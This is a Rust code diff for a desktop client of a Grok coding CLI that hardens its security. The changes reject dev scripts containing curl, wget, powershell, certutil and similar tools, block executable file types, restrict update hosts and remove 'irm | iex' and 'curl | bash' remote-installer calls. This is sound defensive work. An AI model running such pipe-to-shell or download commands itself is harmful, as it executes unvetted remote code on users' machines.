+    for (from, to) in [
+        ("nodejs.exe", "node"),
+        ("node.exe", "node"),
+        ("python3.exe", "python3"),
+        ("python.exe", "python"),
+        ("py.exe", "python"),
+        ("bun.exe", "bun"),
+        ("deno.exe", "deno"),
+        ("mshta.exe", "mshta"),
+        ("wscript.exe", "wscript"),
+        ("cscript.exe", "cscript"),
+        ("powershell.exe", "powershell"),
+        ("pwsh.exe", "powershell"),
+        ("cmd.exe", "cmd"),
+        ("curl.exe", "curl"),
+        ("wget.exe", "wget"),
+        ("certutil.exe", "certutil"),
+        ("bitsadmin.exe", "bitsadmin"),
+    ] {
+        s = s.replace(from, to);
+    }
+    s
+}
+
+/// Allow only known frontend dev script shapes (no shell chaining).
+fn is_safe_preview_dev_script(script: &str) -> bool {
+    // R22 review-close: strip `.exe` so `node.exe -e` cannot bypass `node -e`.
+    let s = normalize_preview_script_for_scan(script);
+    if s.is_empty() {
+        return false;
+    }
+    // Reject shell metacharacters / chaining / redirects.
+    if s.contains('|')
+        || s.contains('&')
+        || s.contains(';')
+        || s.contains('`')
+        || s.contains('$')
+        || s.contains('>')
+        || s.contains('<')
+        || s.contains('\n')
+        || s.contains("\r")
+        || s.contains("$((")
+        || s.contains("curl ")
+        || s.contains("wget ")
+        || s.contains("powershell")
+        || s.contains("cmd ")
+        || s.contains("rm ")
+        || s.contains("del ")
+        || s.contains("bash ")
+        || s.contains("/bin/")
+        || s.contains("node -e")
+        || s.contains("node -p")
+        || s.contains("node --eval")
+        || s.contains("bun -e")
+        || s.contains("deno eval")
+        || s.contains("python -c")
+        || s.contains("python3 -c")
+        || s.contains("mshta")
+        || s.contains("wscript")
+        || s.contains("cscript")
+        || s.contains("rundll")
+        || s.contains("regsvr")
+        || s.contains("bitsadmin")
+        || s.contains("certutil")
+        || s.contains("eval ")
+    {
+        return false;
+    }
+    // Known frontend tooling substrings in package.json "dev" value.
+    const MARKERS: &[&str] = &[
+        "vite",
+        "next",
+        "nuxt",
+        "astro",
+        "react-scripts",
+        "webpack",
+        "webpack-dev-server",
+        "vue-cli-service",
+        "ng serve",
+        "parcel",
+        "remix",
+        "solid-start",
+        "svelte-kit",
+        "qwik",
+        "rsbuild",
+        "farm",
+    ];
+    MARKERS.iter().any(|m| s.contains(m)) || s == "dev" || s.starts_with("dev ")
 }
 
 fn checked_service_url(value: &str, label: &str) -> Result<String, String> {
@@ -1122,6 +1781,10 @@ fn checked_service_url(value: &str, label: &str) -> Result<String, String> {
     let local_http = parsed.scheme() == "http" && is_loopback_host(parsed.host_str());
     if !secure && !local_http {
         return Err(format!("{label}必须使用 HTTPS；仅本机回环地址允许 HTTP"));
+    }
+    // R16: refuse cloud IMDS / link-local even over HTTPS.
+    if is_blocked_ssrf_host(parsed.host_str()) {
+        return Err(format!("{label}不能指向链路本地或云元数据地址"));
     }
     // Use url's serialized representation instead of the original input.
     // URL parsers may tolerate ASCII whitespace that would otherwise become a
@@ -1153,7 +1816,8 @@ fn preview_type(path: &Path) -> (&'static str, &'static str) {
         "jpg" | "jpeg" => ("image", "image/jpeg"),
         "gif" => ("image", "image/gif"),
         "webp" => ("image", "image/webp"),
-        "svg" => ("image", "image/svg+xml"),
+        // R19: SVG as text — data:image/svg+xml can be scriptable; never render as <img>.
+        "svg" => ("text", "text/plain"),
         "bmp" => ("image", "image/bmp"),
         "txt" | "log" | "json" | "jsonl" | "toml" | "yaml" | "yml" | "xml" | "css" | "js"
         | "jsx" | "ts" | "tsx" | "rs" | "py" | "go" | "java" | "c" | "h" | "cpp" | "hpp" | "sh"
@@ -1162,8 +1826,44 @@ fn preview_type(path: &Path) -> (&'static str, &'static str) {
     }
 }
 
+fn is_skipped_workspace_dir(name: &str) -> bool {
+    matches!(
+        name,
+        ".git"
+            | "node_modules"
+            | "target"
+            | "dist"
+            | "build"
+            | "out"
+            | ".next"
+            | ".nuxt"
+            | ".turbo"
+            | ".cache"
+            | ".pnpm-store"
+            | "__pycache__"
+            | ".venv"
+            | "venv"
+            | "coverage"
+            | ".idea"
+            | ".vs"
+            | "Pods"
+            | "vendor"
+            | "bin"
+            | "obj"
+    )
+}
+
 fn collect_workspace_entries(root: &Path, dir: &Path, output: &mut Vec<WorkspaceEntry>) {
-    if output.len() >= MAX_WORKSPACE_ENTRIES {
+    collect_workspace_entries_depth(root, dir, output, 0);
+}
+
+fn collect_workspace_entries_depth(
+    root: &Path,
+    dir: &Path,
+    output: &mut Vec<WorkspaceEntry>,
+    depth: usize,
+) {
+    if output.len() >= MAX_WORKSPACE_ENTRIES || depth > MAX_WORKSPACE_DEPTH {
         return;
     }
     let Ok(entries) = fs::read_dir(dir) else {
@@ -1178,18 +1878,14 @@ fn collect_workspace_entries(root: &Path, dir: &Path, output: &mut Vec<Workspace
         let Ok(file_type) = entry.file_type() else {
             continue;
         };
+        // Never follow symlinks (escape / cycles outside the workspace).
         if file_type.is_symlink() {
             continue;
         }
         let path = entry.path();
         let name = entry.file_name().to_string_lossy().to_string();
         let is_dir = file_type.is_dir();
-        if is_dir
-            && matches!(
-                name.as_str(),
-                ".git" | "node_modules" | "target" | "dist" | ".pnpm-store"
-            )
-        {
+        if is_dir && is_skipped_workspace_dir(&name) {
             continue;
         }
         let relative = path.strip_prefix(root).unwrap_or(&path);
@@ -1199,7 +1895,7 @@ fn collect_workspace_entries(root: &Path, dir: &Path, output: &mut Vec<Workspace
             is_dir,
         });
         if is_dir {
-            collect_workspace_entries(root, &path, output);
+            collect_workspace_entries_depth(root, &path, output, depth + 1);
         }
     }
 }
@@ -1385,14 +2081,24 @@ fn configured_grok_command(app: &tauri::AppHandle) -> GrokRuntimeInfo {
         .find(|candidate| !bundled_paths.iter().any(|bundled| bundled == candidate));
     let preference = read_runtime_preference(app);
 
-    if let Some(path) = std::env::var_os("GROK_DESKTOP_CLI").filter(|value| !value.is_empty()) {
-        return runtime_info(
-            PathBuf::from(path).to_string_lossy().into_owned(),
-            "override",
-            preference,
-            system.as_deref().map(path_for_webview),
-            bundled.as_deref().map(path_for_webview),
-            false,
+    // R18: override must be an absolute, existing file — never a relative PATH name.
+    if let Some(raw) = std::env::var_os("GROK_DESKTOP_CLI").filter(|value| !value.is_empty()) {
+        let path = PathBuf::from(&raw);
+        if path.is_absolute() {
+            if let Some(canonical) = normalized_existing_path(&path) {
+                return runtime_info(
+                    canonical.to_string_lossy().into_owned(),
+                    "override",
+                    preference,
+                    system.as_deref().map(path_for_webview),
+                    bundled.as_deref().map(path_for_webview),
+                    false,
+                );
+            }
+        }
+        eprintln!(
+            "grox: 警告：GROK_DESKTOP_CLI 无效（需为已存在的绝对可执行路径），已忽略：{}",
+            path.display()
         );
     }
 
@@ -1446,71 +2152,22 @@ fn set_grok_runtime_preference(
 #[tauri::command]
 async fn install_official_grok_cli(
     app: tauri::AppHandle,
-    state: tauri::State<'_, Arc<AcpState>>,
+    _state: tauri::State<'_, Arc<AcpState>>,
 ) -> Result<GrokRuntimeInfo, String> {
-    // Windows cannot replace a running executable. Stop the official CLI
-    // child before invoking its official updater; the webview reload below
-    // starts the freshly installed binary again.
-    if let Some(process) = state.process.lock().await.take() {
-        terminate_process(process).await;
-    }
-    let mut command = if cfg!(windows) {
-        let mut command = Command::new("powershell.exe");
-        command.args([
-            "-NoLogo",
-            "-NoProfile",
-            "-NonInteractive",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            &format!("irm '{}' | iex", GROK_INSTALL_PS1_URL),
-        ]);
-        command
-    } else if cfg!(target_os = "macos") {
-        let mut command = Command::new("/bin/bash");
-        command.args([
-            "-c",
-            &format!("curl -fsSL '{}' | bash", GROK_INSTALL_SH_URL),
-        ]);
-        command
-    } else {
-        return Err("Grox 当前仅支持在 Windows 和 macOS 上自动安装 CLI".into());
-    };
-    command
-        .stdin(Stdio::null())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .kill_on_drop(true);
-    #[cfg(windows)]
-    {
-        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-        command.creation_flags(CREATE_NO_WINDOW);
-    }
-
-    let output = tokio::time::timeout(Duration::from_secs(300), command.output())
-        .await
-        .map_err(|_| "官方 Grok CLI 安装超过 5 分钟，已停止等待".to_string())?
-        .map_err(|error| format!("无法启动官方 Grok CLI 安装程序：{error}"))?;
-    if !output.status.success() {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        return Err(format!(
-            "官方 Grok CLI 安装失败（退出码 {}）：\n{}",
-            output.status.code().map_or_else(|| "unknown".into(), |code| code.to_string()),
-            stderr
-        ));
-    }
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    if stdout.contains("already installed") || stdout.contains("up to date") {
-        // Treat as success even if no-op
-    } else if !stdout.trim().is_empty() {
-        // Optionally log, but since UI, perhaps emit later
-    }
-    write_runtime_preference(&app, "system")?;
+    // Security: never `irm | iex` / `curl | bash` remote installers from the desktop.
+    // Open the official page; operator installs CLI with system tools, then re-detects.
+    open_external(GROK_CLI_INSTALL_PAGE.to_string())?;
     let runtime = configured_grok_command(&app);
-    if runtime.system_path.is_none() {
-        return Err("安装程序已完成，但 Grox 尚未在标准位置检测到 grok；请重启后重试".into());
+    if runtime.system_path.is_some() {
+        // Already present — just re-prefer system.
+        write_runtime_preference(&app, "system")?;
+        return Ok(configured_grok_command(&app));
     }
-    Ok(runtime)
+    Err(
+        "已在浏览器打开官方安装说明。为安全起见，Grox 桌面端不再自动执行远程安装脚本。\n\
+         请按页面完成 Grok Build CLI 安装后，点「重新检测」或重启 Grox。"
+            .into(),
+    )
 }
 
 fn checked_workspace(cwd: &str) -> Result<PathBuf, String> {
@@ -1646,6 +2303,8 @@ async fn start_project_preview(
     state: tauri::State<'_, Arc<PreviewState>>,
     cwd: String,
     start: bool,
+    // Operator must pass true after an in-app confirm (workspace package.json scripts).
+    confirm_start: Option<bool>,
 ) -> Result<ProjectPreview, String> {
     let workspace = checked_workspace(&cwd)?;
     let Some(target) = detect_frontend(&workspace) else {
@@ -1708,6 +2367,23 @@ async fn start_project_preview(
     if !start {
         return Ok(preview_response(&target, "detected", None));
     }
+    if confirm_start != Some(true) {
+        return Ok(preview_response(
+            &target,
+            "detected",
+            Some("需要确认后才启动开发服务器（将执行 package.json 中的 dev 脚本）".into()),
+        ));
+    }
+    if !is_safe_preview_dev_script(&target.script) {
+        return Ok(preview_response(
+            &target,
+            "error",
+            Some(format!(
+                "开发脚本不在安全允许列表中，已拒绝启动：{}",
+                target.script.chars().take(120).collect::<String>()
+            )),
+        ));
+    }
     if !target.root.join("node_modules").is_dir() && !workspace.join("node_modules").is_dir() {
         return Ok(preview_response(
             &target,
@@ -1716,17 +2392,17 @@ async fn start_project_preview(
         ));
     }
 
-    let executable = if cfg!(windows) {
-        match target.manager {
-            "pnpm" => "pnpm.cmd",
-            "yarn" => "yarn.cmd",
-            "bun" => "bun.exe",
-            _ => "npm.cmd",
-        }
-    } else {
-        target.manager
+    let Some(executable) = resolve_package_manager_command(target.manager) else {
+        return Ok(preview_response(
+            &target,
+            "error",
+            Some(format!(
+                "未找到 {} 的绝对安装路径（已拒绝 %PATH% 裸名回落，防劫持）",
+                target.manager
+            )),
+        ));
     };
-    let mut command = Command::new(executable);
+    let mut command = Command::new(&executable);
     match target.manager {
         "yarn" => {
             command.arg("dev");
@@ -1768,7 +2444,11 @@ async fn start_project_preview(
             return Ok(preview_response(
                 &target,
                 "error",
-                Some(format!("无法启动 {}：{error}", target.manager)),
+                Some(format!(
+                    "无法启动 {}（{}）：{error}",
+                    target.manager,
+                    executable.display()
+                )),
             ));
         }
     };
@@ -1985,11 +2665,7 @@ async fn download_to_file(
     url: &str,
     dest: &Path,
 ) -> Result<(), String> {
-    let client = reqwest::Client::builder()
-        .timeout(Duration::from_secs(300))
-        .user_agent(format!("Grox-Desktop/{CLIENT_VERSION}"))
-        .build()
-        .map_err(|error| format!("无法创建下载客户端：{error}"))?;
+    let client = update_download_http_client()?;
 
     let response = client
         .get(url)
@@ -2205,6 +2881,7 @@ async fn install_app_update(
                 let handle = app.clone();
                 tauri::async_runtime::spawn(async move {
                     tokio::time::sleep(Duration::from_millis(600)).await;
+                    append_lifecycle_log("exit after install_app_update restarted=true");
                     handle.exit(0);
                 });
             }
@@ -2226,15 +2903,47 @@ async fn install_app_update(
     }
 }
 
+/// Only GitHub release asset hosts (and our known API/CDN shapes) may be used
+/// for in-app update downloads — blocks arbitrary URL → install chains.
+fn is_allowed_update_download_host(host: Option<&str>) -> bool {
+    let Some(host) = host.map(|h| h.trim().to_ascii_lowercase()) else {
+        return false;
+    };
+    if host.is_empty() || host.contains('@') {
+        return false;
+    }
+    host == "github.com"
+        || host == "api.github.com"
+        || host == "objects.githubusercontent.com"
+        || host == "release-assets.githubusercontent.com"
+        || host.ends_with(".githubusercontent.com")
+        || host.ends_with(".github.com")
+}
+
 async fn install_app_update_inner(
     app: &tauri::AppHandle,
     download_url: String,
     asset_name: Option<String>,
 ) -> Result<AppUpdateInstallResult, String> {
-    let parsed = url::Url::parse(&download_url).map_err(|error| format!("无效下载链接：{error}"))?;
-    if !matches!(parsed.scheme(), "http" | "https") {
-        return Err("只允许从 HTTP(S) 下载更新".into());
+    let trimmed = download_url.trim();
+    if trimmed.is_empty() || trimmed.len() > 8_192 {
+        return Err("更新下载链接长度无效".into());
     }
+    if trimmed.chars().any(|c| c.is_control()) {
+        return Err("更新下载链接包含非法控制字符".into());
+    }
+    let parsed = url::Url::parse(trimmed).map_err(|error| format!("无效下载链接：{error}"))?;
+    // R14: remote update assets must be HTTPS (no cleartext download).
+    if parsed.scheme() != "https" {
+        return Err("更新下载必须使用 HTTPS".into());
+    }
+    if !parsed.username().is_empty() || parsed.password().is_some() {
+        return Err("更新下载链接不能包含用户名或密码".into());
+    }
+    if !is_allowed_update_download_host(parsed.host_str()) {
+        return Err("更新下载只允许来自 GitHub Releases 官方域名".into());
+    }
+    let download_url = parsed.as_str().to_string();
 
     #[cfg(not(target_os = "macos"))]
     {
@@ -2340,11 +3049,7 @@ async fn install_app_update_inner(
 
 #[tauri::command]
 async fn check_app_update() -> Result<AppUpdateInfo, String> {
-    let client = reqwest::Client::builder()
-        .timeout(Duration::from_secs(20))
-        .user_agent(format!("Grox-Desktop/{CLIENT_VERSION}"))
-        .build()
-        .map_err(|error| format!("无法创建 HTTP 客户端：{error}"))?;
+    let client = github_api_http_client()?;
 
     let response = client
         .get(GROX_RELEASES_LATEST_API)
@@ -2451,10 +3156,17 @@ fn read_preview_file(cwd: String, path: String) -> Result<PreviewFile, String> {
     if kind == "unsupported" {
         return Err("暂不支持预览该文件类型".into());
     }
+    // HTML previews are sandboxed but still cap size harder (DOM cost).
+    if kind == "html" && metadata.len() > 2 * 1024 * 1024 {
+        return Err("HTML 预览不能超过 2 MB".into());
+    }
     let bytes = fs::read(&file).map_err(|error| format!("无法读取 {}：{error}", file.display()))?;
     let content = if kind == "image" {
         BASE64.encode(bytes)
     } else {
+        if bytes.contains(&0) {
+            return Err("文本预览不支持包含空字节的二进制文件".into());
+        }
         String::from_utf8(bytes).map_err(|_| "文件不是有效的 UTF-8 文本".to_string())?
     };
     Ok(PreviewFile {
@@ -2484,7 +3196,7 @@ fn open_in_explorer(cwd: String, path: Option<String>) -> Result<(), String> {
     };
 
     #[cfg(windows)]
-    std::process::Command::new("explorer.exe")
+    std::process::Command::new(system32_tool("explorer.exe"))
         .arg(&target)
         .spawn()
         .map_err(|error| format!("无法打开资源管理器：{error}"))?;
@@ -2581,14 +3293,15 @@ fn image_mime(bytes: &[u8]) -> Option<&'static str> {
     None
 }
 
-/// Resolve a path the user themselves supplied in the composer. This does not
-/// change the agent's filesystem authority: only image files explicitly named
-/// in a message become that message's multimodal attachments.
+/// Resolve a path the user themselves supplied in the composer.
+/// Only image files under the current workspace become multimodal attachments
+/// (same containment as `checked_workspace_file` — no absolute/home escape).
 fn checked_explicit_prompt_image(workspace: &Path, requested: &str) -> Result<PathBuf, String> {
     let requested = requested.trim();
     if requested.is_empty() {
         return Err("图片路径不能为空".into());
     }
+    // Resolve ~ / file:// / absolute / relative; then hard-require workspace containment.
     let candidate = if requested == "~" || requested.starts_with("~/") || requested.starts_with("~\\") {
         let home = user_home()?;
         if requested == "~" {
@@ -2620,6 +3333,10 @@ fn checked_explicit_prompt_image(workspace: &Path, requested: &str) -> Result<Pa
     let canonical = candidate
         .canonicalize()
         .map_err(|error| format!("无法解析图片路径 {}：{error}", candidate.display()))?;
+    // Hard workspace boundary — same as checked_workspace_file.
+    if !path_is_inside_workspace(workspace, &canonical) {
+        return Err("只能附加当前项目内的图片".into());
+    }
     let metadata = fs::metadata(&canonical)
         .map_err(|error| format!("无法读取图片 {}：{error}", canonical.display()))?;
     if !metadata.is_file() {
@@ -2670,6 +3387,10 @@ fn read_prompt_image_paths(cwd: String, paths: Vec<String>) -> Result<Vec<Prompt
         }
         let mime = image_mime(&bytes)
             .ok_or_else(|| "图片内容不是受支持的图片格式".to_string())?;
+        // R19: SVG is scriptable in some embedding contexts — never multimodal-attach.
+        if mime == "image/svg+xml" {
+            return Err("不支持将 SVG 作为提示图片附件".into());
+        }
         images.push(PromptPathImage {
             path,
             name: file
@@ -2686,8 +3407,49 @@ fn read_prompt_image_paths(cwd: String, paths: Vec<String>) -> Result<Vec<Prompt
 }
 
 
+/// Prefer absolute Git installs so a PATH-planted `git.exe` cannot run under the shell.
+/// R20: fail-closed — never fall back to bare `git` via `%PATH%` (same class as R18 PM).
+fn resolve_git_executable() -> Option<PathBuf> {
+    #[cfg(windows)]
+    {
+        let mut candidates: Vec<PathBuf> = Vec::new();
+        for key in ["ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"] {
+            if let Ok(root) = std::env::var(key) {
+                let base = PathBuf::from(root);
+                candidates.push(base.join(r"Git\cmd\git.exe"));
+                candidates.push(base.join(r"Git\bin\git.exe"));
+                // Portable / user-scoped installs under LocalAppData\Programs.
+                candidates.push(base.join(r"Programs\Git\cmd\git.exe"));
+                candidates.push(base.join(r"Programs\Git\bin\git.exe"));
+            }
+        }
+        candidates.push(PathBuf::from(r"C:\Program Files\Git\cmd\git.exe"));
+        candidates.push(PathBuf::from(r"C:\Program Files\Git\bin\git.exe"));
+        candidates.push(PathBuf::from(r"C:\Program Files (x86)\Git\cmd\git.exe"));
+        for path in candidates {
+            if path.is_file() {
+                return Some(path);
+            }
+        }
+        return None;
+    }
+    #[cfg(unix)]
+    {
+        for path in ["/usr/bin/git", "/usr/local/bin/git", "/opt/homebrew/bin/git"] {
+            let path = PathBuf::from(path);
+            if path.is_file() {
+                return Some(path);
+            }
+        }
+        None
+    }
+}
+
 fn git_command(root: &Path, args: &[&str]) -> Result<std::process::Output, String> {
-    let mut command = std::process::Command::new("git");
+    let git = resolve_git_executable().ok_or_else(|| {
+        "未找到 Git 的绝对安装路径（已拒绝 %PATH% 裸名回落，防劫持）".to_string()
+    })?;
+    let mut command = std::process::Command::new(&git);
     command.current_dir(root).args(args);
     #[cfg(windows)]
     {
@@ -2696,7 +3458,7 @@ fn git_command(root: &Path, args: &[&str]) -> Result<std::process::Output, Strin
     }
     command
         .output()
-        .map_err(|error| format!("无法运行 Git：{error}"))
+        .map_err(|error| format!("无法运行 Git（{}）：{error}", git.display()))
 }
 
 fn git_text(root: &Path, args: &[&str]) -> Result<String, String> {
@@ -2823,6 +3585,13 @@ fn git_push(cwd: String) -> Result<String, String> {
     if branch.is_empty() {
         return Err("当前处于 detached HEAD，无法直接推送".into());
     }
+    // R21: refuse odd/control branch names before they become git argv.
+    if branch.len() > 200
+        || branch.starts_with('-')
+        || branch.chars().any(|c| c.is_control() || c == ':' || c == '\\')
+    {
+        return Err("当前分支名无效，已拒绝推送".into());
+    }
     let has_upstream = optional_git_text(
         &root,
         &[
@@ -2842,6 +3611,62 @@ fn git_push(cwd: String) -> Result<String, String> {
 }
 
 
+/// Extensions that the OS would execute (or script) if opened as a document.
+/// R19: never hand these to the shell/default handler from the desktop UI.
+/// R22 review-close: .hta and other classic Windows script-host associations.
+fn is_dangerous_open_extension(path: &Path) -> bool {
+    let ext = path
+        .extension()
+        .and_then(|value| value.to_str())
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+    matches!(
+        ext.as_str(),
+        "exe"
+            | "com"
+            | "bat"
+            | "cmd"
+            | "ps1"
+            | "msi"
+            | "msp"
+            | "scr"
+            | "cpl"
+            | "msc"
+            | "js"
+            | "jse"
+            | "mjs"
+            | "cjs"
+            | "vbs"
+            | "vbe"
+            | "wsf"
+            | "wsh"
+            | "ws"
+            | "wsc"
+            | "hta"
+            | "htc"
+            | "lnk"
+            | "url"
+            | "pif"
+            | "reg"
+            | "msix"
+            | "appx"
+            | "appref-ms"
+            | "dll"
+            | "sys"
+            | "jar"
+            | "jnlp"
+            | "scf"
+            | "search-ms"
+            | "searchconnector-ms"
+            | "chm"
+            | "inf"
+            | "ins"
+            | "isp"
+            | "job"
+            | "cab"
+    )
+}
+
 /// Ask the platform to open a workspace file with its default application.
 #[tauri::command]
 fn open_file_with_default(cwd: String, path: String) -> Result<(), String> {
@@ -2850,8 +3675,11 @@ fn open_file_with_default(cwd: String, path: String) -> Result<(), String> {
     if !file.is_file() {
         return Err("只能使用默认应用打开文件".into());
     }
+    if is_dangerous_open_extension(&file) {
+        return Err("出于安全考虑，不能直接打开可执行或脚本类文件".into());
+    }
     #[cfg(windows)]
-    std::process::Command::new("explorer.exe")
+    std::process::Command::new(system32_tool("explorer.exe"))
         .arg(&file)
         .spawn()
         .map_err(|error| format!("无法打开默认应用：{error}"))?;
@@ -3146,16 +3974,15 @@ foreach ($registryRoot in $registryRoots) {
   }
 }
 
-# File Explorer and installed terminal shells are OS applications, not always
-# present below HKCR\Applications. Add them only when the command actually
-# exists on this machine.
+# File Explorer / shells: absolute SystemRoot paths only (R21 — never Get-Command PATH).
+$sys = [Environment]::GetFolderPath('System')
+if ([string]::IsNullOrWhiteSpace($sys)) { $sys = Join-Path $env:SystemRoot 'System32' }
 foreach ($entry in @(
-  @{ id = 'file-explorer'; name = 'File Explorer'; command = 'explorer.exe' },
-  @{ id = 'windows-terminal'; name = 'Windows Terminal'; command = 'wt.exe' },
-  @{ id = 'powershell'; name = 'PowerShell'; command = 'powershell.exe' }
+  @{ id = 'file-explorer'; name = 'File Explorer'; path = (Join-Path $env:SystemRoot 'explorer.exe') },
+  @{ id = 'powershell'; name = 'PowerShell'; path = (Join-Path $sys 'WindowsPowerShell\v1.0\powershell.exe') },
+  @{ id = 'windows-terminal'; name = 'Windows Terminal'; path = (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\wt.exe') }
 )) {
-  $command = Get-Command $entry.command
-  if ($null -ne $command) { Add-App $entry.id $entry.name $command.Source }
+  if (Test-Path -LiteralPath $entry.path) { Add-App $entry.id $entry.name $entry.path }
 }
 $apps.Values | Sort-Object name | ConvertTo-Json -Compress
 "#
@@ -3168,7 +3995,7 @@ fn list_windows_open_applications() -> Result<Vec<OpenApplicationOption>, String
     // flashes a full PowerShell console (the blank blue window operators saw).
     use std::os::windows::process::CommandExt as _;
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-    let output = std::process::Command::new("powershell.exe")
+    let output = std::process::Command::new(system32_tool("powershell.exe"))
         .args([
             "-NoLogo",
             "-NoProfile",
@@ -3224,8 +4051,10 @@ fn checked_windows_application(requested: &str) -> Result<PathBuf, String> {
         .and_then(|value| value.to_str())
         .unwrap_or_default()
         .to_ascii_lowercase();
-    if !matches!(extension.as_str(), "exe" | "com" | "bat" | "cmd" | "ps1") {
-        return Err("打开应用必须是 Windows 可执行文件".into());
+    // R19: only native binaries as the *application* launcher — never bat/cmd/ps1
+    // (script hosts would run with the workspace file as argv under attacker control).
+    if !matches!(extension.as_str(), "exe" | "com") {
+        return Err("打开应用必须是 Windows 原生可执行文件（.exe/.com）".into());
     }
     let discovered = list_windows_open_applications()?;
     if !discovered.iter().any(|item| {
@@ -3563,6 +4392,10 @@ fn open_file_with_application(cwd: String, path: String, application: String) ->
     if !file.is_file() {
         return Err("只能使用应用打开文件".into());
     }
+    // R19: refuse opening executable/script *documents* (path is the file to view).
+    if is_dangerous_open_extension(&file) {
+        return Err("出于安全考虑，不能用外部应用打开可执行或脚本类文件".into());
+    }
     #[cfg(target_os = "macos")]
     {
         let application_path = checked_application_bundle(&application)?;
@@ -3594,24 +4427,9 @@ fn open_file_with_application(cwd: String, path: String, application: String) ->
     {
         use std::os::windows::process::CommandExt as _;
         const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+        // R19/R20: checked_windows_application only allows .exe/.com — spawn directly.
         let target = checked_windows_application(&application)?;
-        let extension = target
-            .extension()
-            .and_then(|value| value.to_str())
-            .unwrap_or_default()
-            .to_ascii_lowercase();
-        let mut command = if matches!(extension.as_str(), "bat" | "cmd") {
-            let mut command = std::process::Command::new("cmd.exe");
-            command.args(["/D", "/C"]).arg(&target);
-            command
-        } else if extension == "ps1" {
-            let mut command = std::process::Command::new("powershell.exe");
-            command.args(["-NoProfile", "-File"]).arg(&target);
-            command
-        } else {
-            std::process::Command::new(&target)
-        };
-        command
+        std::process::Command::new(&target)
             .arg(&file)
             .creation_flags(CREATE_NO_WINDOW)
             .spawn()
@@ -3648,12 +4466,15 @@ fn open_file_with_dialog(cwd: String, path: String) -> Result<(), String> {
     if !file.is_file() {
         return Err("只能选择文件的打开方式".into());
     }
+    if is_dangerous_open_extension(&file) {
+        return Err("出于安全考虑，不能为可执行或脚本类文件选择打开方式".into());
+    }
 
     #[cfg(windows)]
     {
         use std::os::windows::process::CommandExt as _;
         const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-        std::process::Command::new("rundll32.exe")
+        std::process::Command::new(system32_tool("rundll32.exe"))
             .arg("shell32.dll,OpenAs_RunDLL")
             .arg(path_for_webview(&file))
             .creation_flags(CREATE_NO_WINDOW)
@@ -3726,8 +4547,46 @@ Use only the grok_desktop_computer MCP tools for an explicit `/computer` or `@Co
     Ok(root)
 }
 
+/// Product gate shared by the tauri command (unit-testable).
+fn computer_use_gate_open(operator_enabled: Option<bool>) -> bool {
+    computer_use_env_enabled() || operator_enabled == Some(true)
+}
+
+/// Pure parser for GROX_COMPUTER_USE (unit-testable without process-global set_var races).
+fn computer_use_env_flag(value: Option<&str>) -> bool {
+    value
+        .map(|v| {
+            let v = v.trim();
+            v == "1" || v.eq_ignore_ascii_case("true")
+        })
+        .unwrap_or(false)
+}
+
+/// Advanced operator env flag (host process). Shared with FE via tauri command.
+fn computer_use_env_enabled() -> bool {
+    computer_use_env_flag(std::env::var("GROX_COMPUTER_USE").ok().as_deref())
+}
+
+/// FE probe so WebView opt-in matches Rust gate when only env is set (R4A-CU-03).
 #[tauri::command]
-fn computer_session_extensions() -> Result<ComputerSessionExtensions, String> {
+fn computer_use_env_enabled_cmd() -> bool {
+    computer_use_env_enabled()
+}
+
+#[tauri::command]
+fn computer_session_extensions(operator_enabled: Option<bool>) -> Result<ComputerSessionExtensions, String> {
+    // Product gate: Computer Use is opt-in (Settings / explicit flag). Env
+    // GROX_COMPUTER_USE=1 also enables for advanced operators.
+    // Soft-fail when closed: return empty MCP/plugin lists so session/new and
+    // session/load still succeed. Prompt-time attach (ensureComputerAttached)
+    // surfaces the opt-in message only when the user actually asks for CU.
+    if !computer_use_gate_open(operator_enabled) {
+        return Ok(ComputerSessionExtensions {
+            mcp_servers: Vec::new(),
+            plugin_dirs: Vec::new(),
+            lease_id: String::new(),
+        });
+    }
     let mut lease_bytes = [0_u8; 16];
     getrandom::fill(&mut lease_bytes)
         .map_err(|error| format!("无法创建 Computer Use 租约：{error}"))?;
@@ -3746,8 +4605,30 @@ fn computer_session_extensions() -> Result<ComputerSessionExtensions, String> {
             lease_id,
         });
     }
-    let plugin = ensure_computer_plugin()?;
-    let endpoint = computer_mcp::serve_http(lease_id.clone())?;
+    // Soft-fail harness start: never kill ordinary chat / session/load because
+    // MCP bind or plugin staging failed (port flake, AV lock, missing plugin).
+    let plugin = match ensure_computer_plugin() {
+        Ok(path) => path,
+        Err(error) => {
+            eprintln!("grox: Computer Use Plugin 不可用，本回合不附带 MCP：{error}");
+            return Ok(ComputerSessionExtensions {
+                mcp_servers: Vec::new(),
+                plugin_dirs: Vec::new(),
+                lease_id,
+            });
+        }
+    };
+    let endpoint = match computer_mcp::serve_http(lease_id.clone()) {
+        Ok(endpoint) => endpoint,
+        Err(error) => {
+            eprintln!("grox: Computer Use MCP 启动失败，本回合不附带 MCP：{error}");
+            return Ok(ComputerSessionExtensions {
+                mcp_servers: Vec::new(),
+                plugin_dirs: Vec::new(),
+                lease_id,
+            });
+        }
+    };
     Ok(ComputerSessionExtensions {
         mcp_servers: vec![serde_json::json!({
             "type": "http",
@@ -3841,6 +4722,19 @@ fn save_media_reference(cwd: String, name: String, data: String) -> Result<Strin
     if bytes.len() > 24 * 1024 * 1024 {
         return Err("参考图片不能超过 24 MB".into());
     }
+    // R18: magic-byte gate — extension alone must not accept HTML/polyglot payloads.
+    let detected = image_mime(&bytes).ok_or_else(|| "参考图片内容不是有效图片".to_string())?;
+    let expected = match extension.as_str() {
+        "png" => "image/png",
+        "jpg" | "jpeg" => "image/jpeg",
+        "webp" => "image/webp",
+        _ => return Err("参考图片仅支持 PNG、JPEG 或 WebP".into()),
+    };
+    if detected != expected {
+        return Err(format!(
+            "参考图片内容与扩展名不符（内容 {detected}，扩展名 .{extension}）"
+        ));
+    }
     let directory = cwd.join(".grox").join("media-input");
     fs::create_dir_all(&directory).map_err(|error| format!("无法创建媒体输入目录：{error}"))?;
     let path = directory.join(format!(
@@ -3865,17 +4759,14 @@ async fn generate_media(
     let prompt = checked_media_prompt(&request, &cwd)?;
